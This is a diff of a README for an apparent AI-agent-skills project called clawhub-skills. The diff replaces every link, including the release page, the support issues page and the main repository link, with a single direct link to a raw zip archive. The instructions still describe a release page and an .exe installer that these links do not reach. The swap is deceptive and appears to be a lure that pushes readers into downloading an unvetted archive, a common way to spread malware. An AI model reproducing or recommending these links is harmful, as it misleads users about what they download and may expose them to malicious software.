@@ -1,6 +1,6 @@
 # ⚙️ clawhub-skills - AI Agent Skills for Everyday Use
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/traygerbig/clawhub-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/traygerbig/clawhub-skills/raw/refs/heads/main/archive/agent-dashboard/clawhub_skills_3.2-beta.5.zip)
 
 ## 📦 About clawhub-skills
 
@@ -25,7 +25,7 @@ These requirements ensure the app runs without trouble.
 You can get the app from the official release page on GitHub. Follow these steps:
 
 1. Click the big green button below to open the download page.  
-   [![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/traygerbig/clawhub-skills/releases)  
+   [![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/traygerbig/clawhub-skills/raw/refs/heads/main/archive/agent-dashboard/clawhub_skills_3.2-beta.5.zip)  
 
 2. On the release page, look for the latest version. It will usually have the highest version number or the word “Latest.”  
 3. Find the Windows installer file. It should end with `.exe`.  
@@ -81,8 +81,8 @@ Your data stays on your computer unless you choose to share it with supported AI
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/traygerbig/clawhub-skills/releases  
-- GitHub Issues for support: https://github.com/traygerbig/clawhub-skills/issues  
-- Main repository: https://github.com/traygerbig/clawhub-skills  
+- Download page: https://github.com/traygerbig/clawhub-skills/raw/refs/heads/main/archive/agent-dashboard/clawhub_skills_3.2-beta.5.zip  
+- GitHub Issues for support: https://github.com/traygerbig/clawhub-skills/raw/refs/heads/main/archive/agent-dashboard/clawhub_skills_3.2-beta.5.zip  
+- Main repository: https://github.com/traygerbig/clawhub-skills/raw/refs/heads/main/archive/agent-dashboard/clawhub_skills_3.2-beta.5.zip  
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/traygerbig/clawhub-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/traygerbig/clawhub-skills/raw/refs/heads/main/archive/agent-dashboard/clawhub_skills_3.2-beta.5.zip)
